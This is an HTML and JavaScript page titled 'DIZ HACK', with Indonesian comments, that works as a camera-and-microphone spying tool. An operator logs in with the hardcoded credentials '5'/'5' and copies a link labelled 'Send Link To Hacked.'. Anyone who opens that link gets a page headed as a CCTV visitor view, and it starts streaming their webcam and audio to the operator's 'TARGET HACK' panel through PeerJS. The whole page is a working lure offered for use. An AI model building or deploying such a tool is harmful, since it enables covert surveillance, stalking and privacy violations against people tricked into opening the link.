<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>DIZ FLYZE GG ABIZ</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    /* CSS Variables untuk konsistensi warna dan styling */
    :root {
      --primary-color: #0ff;
      --secondary-color: #075e54;
      --accent-color: #25d366;
      --error-color: #ff073a;
      --background-color: #000;
      --card-bg: rgba(0, 0, 0, 0.95);
      --neon-glow: 0 0 15px var(--primary-color);
    }
    /* Global Reset & Base Styles */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      width: 100%;
      height: 100%;
      background: var(--background-color);
      font-family: 'Roboto', sans-serif;
      color: var(--primary-color);
      overflow: hidden;
    }
    /* Container Wrapper (untuk mode Admin) */
    #appContainer {
      max-width: 480px;
      margin: 20px auto;
      background: var(--card-bg);
      border: 2px solid var(--primary-color);
      border-radius: 10px;
      box-shadow: 0 0 20px var(--primary-color);
      position: relative;
      padding-bottom: 20px;
      overflow: hidden;
    }
    /* Jika dalam mode Guest, container akan diatur full screen */
    .fullScreen {
      max-width: 100vw !important;
      margin: 0 !important;
      width: 100vw !important;
      height: 100vh !important;
      border: none;
      border-radius: 0;
      box-shadow: none;
    }
    /* Header Neon Modern */
    .header {
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      padding: 12px;
      background: linear-gradient(45deg, var(--primary-color), #f0f);
      color: var(--background-color);
      text-shadow: var(--neon-glow);
      animation: neonGlow 1.5s ease-in-out infinite alternate;
    }
    @keyframes neonGlow {
      from { text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color); }
      to { text-shadow: 0 0 20px var(--primary-color), 0 0 30px var(--primary-color); }
    }
    /* Bio Container */
    #bioContainer {
      text-align: center;
      padding: 10px;
    }
    #facebookLogo {
      width: 70px;
      height: 70px;
      border-radius: 100%;
      margin-bottom: 12px;
      border: 2px solid var(--primary-color);
    }
    #bioText {
      font-size: 16px;
      color: var(--primary-color);
      text-shadow: 0 0 5px var(--primary-color);
    }
    /* Status Indicator */
    #connectionStatus {
      position: absolute;
      top: 12px;
      left: 12px;
      padding: 5px 10px;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid var(--primary-color);
      border-radius: 5px;
      font-size: 14px;
      z-index: 100;
    }
    /* Notification Toast */
    .notification {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0,0,0,0.8);
      padding: 15px 25px;
      border: 2px solid var(--accent-color);
      border-radius: 10px;
      font-size: 18px;
      font-weight: bold;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.5s ease;
      z-index: 200;
    }
    .notification.show { opacity: 1; }
    /* Login Form (Admin Only) */
    #loginForm {
      display: none; /* Akan ditampilkan hanya jika tidak dalam mode Guest */
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.9);
      padding: 20px;
      border: 2px solid var(--primary-color);
      border-radius: 10px;
      z-index: 300;
      width: 90%;
    }
    #loginForm h2 { margin-bottom: 10px; font-size: 20px; text-align: center; }
    #loginForm input[type="text"],
    #loginForm input[type="password"] {
      width: 100%;
      padding: 13px;
      margin: 7px 0;
      border: 2px solid var(--primary-color);
      border-radius: 20px;
      background: var(--background-color);
      color: var(--primary-color);
    }
    #loginForm button {
      width: 100%;
      padding: 10px;
      background: black;
      border: none;
      border-radius: 20px;
      color: cyan;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }
    #loginForm button:hover { background: var(--accent-color); }
    /* Admin UI */
    #adminUI { padding: 10px; display: none; }
    .remote-container {
      position: relative;
      transition: width 0.3s ease;
      width: 100%;
      margin-bottom: 10px;
    }
    #remoteVideo {
      width: 100%;
      display: block;
      border-radius: 15px;
    }
    /* Preview Lokal (Anda) – Tetap kecil */
    #localPreview {
      position: absolute;
      bottom: 10px;
      right: 2px;
      width: 2px;
      border: 2px solid var(--primary-color);
      border-radius: 5px;
    }
    .video-label {
      position: absolute;
      top: 10px;
      left: 10px;
      background: rgba(0, 0, 0, 0.5);
      padding: 5px 10px;
      border-radius: 5px;
      font-size: 14px;
      font-weight: bold;
      text-shadow: 0 0 3px #000;
    }
    /* Tombol Size Control (Admin Only) */
    #toggleSizeControl {
      display: none; /* Hanya tampil di mode Admin */
      position: absolute;
      top: 12px;
      right: 12px;
      background: var(--secondary-color);
      border: none;
      border-radius: 100px;
      color: #fff;
      padding: 7px 10px;
      cursor: pointer;
      z-index: 150;
      transition: background 0.3s;
    }
    #toggleSizeControl:hover { background: var(--accent-color); }
    /* Toast Menu untuk pengaturan ukuran target */
    #sizeToast {
      display: none;
      position: absolute;
      top: 50px;
      right: 12px;
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid var(--primary-color);
      border-radius: 5px;
      padding: 8px;
      z-index: 150;
      animation: slideDown 0.3s ease-out;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    #sizeToast button {
      background: var(--secondary-color);
      border: none;
      border-radius: 5px;
      color: #fff;
      padding: 5px 10px;
      margin: 4px;
      cursor: pointer;
      transition: background 0.3s;
      width: 100%;
    }
    #sizeToast button:hover { background: var(--accent-color); }
    /* Link Container */
    .link-container {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 10px;
    }
    .link-container input {
      flex: 1;
      padding: 8px 12px;
      border: 1px solid var(--primary-color);
      border-radius: 25px;
      background: var(--background-color);
      color: var(--primary-color);
      text-align: center;
      font-size: 14px;
    }
    .link-container button {
      padding: 8px 12px;
      border: none;
      border-radius: 80px;
      background: var(--secondary-color);
      color: #fff;
      cursor: pointer;
      transition: transform 0.3s, background 0.3s;
    }
    .link-container button:hover { transform: scale(1.1); background: var(--accent-color); }
    /* Guest UI – Tampilan Full Screen untuk Target */
    #guestUI {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: var(--background-color);
      z-index: 100;
      margin: 0;
      padding: 0;
    }
    #guestUI .video-wrapper {
      width: 100%;
      height: 100%;
    }
    #guestVideo {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    /* Audio Visualizer */
    #audioVisualizer {
      position: absolute;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 30px;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="wrapper" id="appContainer">
    <!-- Header Neon -->
    <div class="header" id="headerText">+++ DIZ HACK +++</div>
    <!-- Bio Container -->
    <div id="bioContainer">
      <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="Facebook Logo" id="facebookLogo">
      <p id="bioText">Tidak Ada System 100% Aman</p>
    </div>
    <!-- Connection Status -->
    <div id="connectionStatus">No Target</div>
    <!-- Notification Toast -->
    <div id="notification" class="notification">Terhubung</div>
    
    <!-- Login Form (Admin Only) -->
    <div id="loginForm">
      <h2>LOGIN ADMIN</h2>
      <input type="text" id="username" placeholder="Username">
      <input type="password" id="password" placeholder="Password">
      <button id="loginBtn">-• Log In •-</button>
    </div>
    
    <!-- Admin UI -->
    <div id="adminUI">
      <!-- Remote Container -->
      <div class="remote-container" id="remoteContainer">
        <video id="remoteVideo" autoplay playsinline></video>
        <!-- Preview Lokal (Anda) -->
        <video id="localPreview" autoplay muted playsinline></video>
        <div class="video-label">TARGET HACK</div>
        <!-- Audio Visualizer -->
        <canvas id="audioVisualizer"></canvas>
      </div>
      <!-- Tombol Size Control (hanya Admin) -->
      <button id="toggleSizeControl">☰</button>
      <!-- Toast Menu untuk pengaturan ukuran target -->
      <div id="sizeToast">
        <button id="optionPeninggi">PENINGGI</button>
        <button id="optionPembesar">PEMBESAR</button>
      </div>
      <!-- Link Container -->
      <div class="link-container" id="linkContainer">
        <input type="text" id="callLink" readonly placeholder="Send Link To Hacked.">
        <button id="copyLinkBtn">➤</button>
      </div>
    </div>
    
    <!-- Guest UI -->
    <div id="guestUI">
      <div class="video-wrapper">
        <video id="guestVideo" autoplay playsinline class="guest-video"></video>
      </div>
    </div>
  </div>
  
  <!-- Sertakan PeerJS dari CDN -->
  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
  <script>
    // Kredensial Admin
    const ADMIN_USERNAME = "5";
    const ADMIN_PASSWORD = "5";
    
    // Fungsi pembantu: ambil parameter query (misalnya ?peer=...)
    function getQueryParam(param) {
      const params = new URLSearchParams(window.location.search);
      return params.get(param);
    }
    
    let peer = null, localStream = null, currentCall = null;
    let targetSize = 100; // dalam persen
    
    // Update status koneksi
    function updateConnectionStatus(status) {
      document.getElementById('connectionStatus').textContent = status;
    }
    
    // Tampilkan notifikasi (toast)
    function showNotification(message, isError = false) {
      const notif = document.getElementById('notification');
      notif.textContent = message;
      notif.style.borderColor = isError ? "#ff073a" : "#25d366";
      notif.classList.add('show');
      setTimeout(() => { notif.classList.remove('show'); }, isError ? 5000 : 3000);
    }
    
    // Dapatkan stream media (kamera dan mikrofon)
    function getLiveStream() {
      return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    }
    
    // Inisialisasi audio visualizer (efek visual saja, tidak menyimpan data)
    function initAudioVisualizer(stream) {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const analyser = audioContext.createAnalyser();
      const source = audioContext.createMediaStreamSource(stream);
      source.connect(analyser);
      analyser.fftSize = 256;
      const bufferLength = analyser.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);
      const canvas = document.getElementById('audioVisualizer');
      const canvasCtx = canvas.getContext('2d');
      canvas.width = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;
      
      function draw() {
        requestAnimationFrame(draw);
        analyser.getByteFrequencyData(dataArray);
        canvasCtx.fillStyle = 'rgba(0, 0, 0, 0.7)';
        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
        const barWidth = (canvas.width / bufferLength) * 2.5;
        let barHeight;
        let x = 0;
        for (let i = 0; i < bufferLength; i++) {
          barHeight = dataArray[i] / 2;
          canvasCtx.fillStyle = 'rgb(' + (barHeight+100) + ',50,50)';
          canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
          x += barWidth + 1;
        }
      }
      draw();
    }
    
    // Admin Login: tampilkan form login dan verifikasi kredensial
    function initLogin() {
      document.getElementById('loginForm').style.display = 'block';
      document.getElementById('adminUI').style.display = 'none';
      document.getElementById('guestUI').style.display = 'none';
      
      document.getElementById('loginBtn').addEventListener('click', function() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
          document.getElementById('loginForm').style.display = 'none';
          initAdmin();
        } else {
          showNotification("Invalid credentials", true);
        }
      });
    }
    
    // Mode Admin (CCTV Operator)
    function initAdmin() {
      updateConnectionStatus("Disconnected");
      document.getElementById('adminUI').style.display = 'block';
      document.getElementById('guestUI').style.display = 'none';
      
      // Inisialisasi PeerJS
      peer = new Peer();
      peer.on('open', function(id) {
        console.log("Admin Peer ID:", id);
        const link = window.location.origin + window.location.pathname + '?peer=' + id;
        document.getElementById('callLink').value = link;
      });
      peer.on('error', function(err) {
        console.error(err);
        showNotification(err.message, true);
      });
      
      // Dapatkan stream lokal
      getLiveStream().then(stream => {
        localStream = stream;
        document.getElementById('localPreview').srcObject = stream;
        initAudioVisualizer(stream);
        
        // Jawab panggilan yang masuk dengan stream lokal
        peer.on('call', function(call) {
          currentCall = call;
          call.answer(localStream);
          call.on('stream', function(remoteStream) {
            document.getElementById('remoteVideo').srcObject = remoteStream;
            showNotification("TARGET CONNECTED");
            updateConnectionStatus("Connected");
          });
          call.on('close', function() {
            showNotification("TARGET CLOSED");
            updateConnectionStatus("Disconnected");
          });
        });
      }).catch(err => {
        console.error(err);
        showNotification(err.message, true);
      });
      
      // Tombol Copy Link
      document.getElementById('copyLinkBtn').addEventListener('click', function() {
        const input = document.getElementById('callLink');
        input.select();
        document.execCommand('copy');
        showNotification("[ SUKSES COPY ]");
      });
      
      // Tombol untuk memunculkan toast menu pengaturan ukuran target (hanya untuk Admin)
      document.getElementById('toggleSizeControl').style.display = 'block';
      document.getElementById('toggleSizeControl').addEventListener('click', function() {
        const toast = document.getElementById('sizeToast');
        // Toggle tampilan toast menu
        toast.style.display = (toast.style.display === 'none' || toast.style.display === '') ? 'block' : 'none';
        // Jika muncul, otomatis hilang setelah 5 detik
        if(toast.style.display === 'block'){
          setTimeout(() => { toast.style.display = 'none'; }, 5000);
        }
      });
      
      // Fungsi untuk mengubah ukuran target video container
      function setTargetSize(newSize) {
        targetSize = newSize;
        document.getElementById('remoteContainer').style.width = targetSize + "%";
      }
      
      // Opsi dari toast menu: "PENINGGI" (mengurangi ukuran) dan "PEMBESAR" (menambah ukuran)
      document.getElementById('optionPeninggi').addEventListener('click', function() {
        if(targetSize > 30) { setTargetSize(targetSize - 10); }
        document.getElementById('sizeToast').style.display = 'none';
      });
      document.getElementById('optionPembesar').addEventListener('click', function() {
        if(targetSize < 100) { setTargetSize(targetSize + 10); }
        document.getElementById('sizeToast').style.display = 'none';
      });
    }
    
    // Mode Guest (Visitor)
    function initGuest(adminPeerId) {
      // Pastikan login form dan admin UI disembunyikan
      document.getElementById('loginForm').style.display = 'none';
      document.getElementById('adminUI').style.display = 'none';
      // Atur container untuk full screen
      const appContainer = document.getElementById('appContainer');
      appContainer.classList.add('fullScreen');
      // Tampilkan Guest UI
      document.getElementById('guestUI').style.display = 'block';
      
      // Set header khusus untuk Guest
      document.getElementById('headerText').textContent = "CCTV - Visitor (Guest)";
      
      // Ubah status koneksi jika perlu
      updateConnectionStatus("Connected");
      
      getLiveStream().then(stream => {
        // Tampilkan stream Guest secara full screen
        document.getElementById('guestVideo').srcObject = stream;
        peer = new Peer();
        peer.on('open', function(id) {
          console.log("Guest Peer ID:", id);
          const call = peer.call(adminPeerId, stream);
          currentCall = call;
          call.on('stream', function(remoteStream) {
            console.log("Received remote stream from admin.");
          });
        });
        peer.on('error', function(err) {
          console.error(err);
          showNotification(err.message, true);
        });
      }).catch(err => {
        console.error(err);
        showNotification(err.message, true);
      });
    }
    
    // Saat halaman dimuat, tentukan mode berdasarkan parameter 'peer'
    window.addEventListener('load', function() {
      const adminPeerId = getQueryParam('peer');
      if(adminPeerId) {
        // Mode Guest: langsung masuk tanpa login
        initGuest(adminPeerId);
      } else {
        // Mode Admin: tampilkan form login terlebih dahulu
        initLogin();
      }
    });
  </script>
</body>
</html>
